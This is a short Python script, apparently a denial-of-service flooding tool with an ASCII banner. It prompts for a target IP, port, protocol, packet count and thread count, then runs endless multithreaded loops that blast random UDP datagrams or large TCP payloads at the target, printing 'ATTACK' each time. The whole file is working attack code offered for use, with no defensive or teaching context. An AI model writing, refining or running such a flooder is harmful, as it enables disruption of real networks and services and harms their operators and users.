import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[0;36;40m")
print("""
░█████╗░░██████╗███████╗██████╗░░█████╗░
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗
███████║╚█████╗░█████╗░░██████╔╝╚═╝███╔╝
██╔══██║░╚═══██╗██╔══╝░░██╔═══╝░░░░╚══╝░
██║░░██║██████╔╝███████╗██║░░░░░░░░██╗░░
╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░░░░░░░╚═╝░░""")

ip = str(input("HOST/IP: "))
port = int(input("PORT HOST: "))
choice = str(input("UDP/TCP: "))
times = int(input("PACKETS: "))
threads = int(input("THREADS: "))

os.system('clear')
def udp():
        data = random._urandom(1180)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(f" ATTACK {ip} Port {port}")
                except:
                        print(f" ATTACK {ip} Port {port}")

def tcp():
        data = random._urandom(102498)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f" ATTACK {ip} Port {port}")
                except:
                        s.close()
                        print(f" ATTACK {ip} Port {port}")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
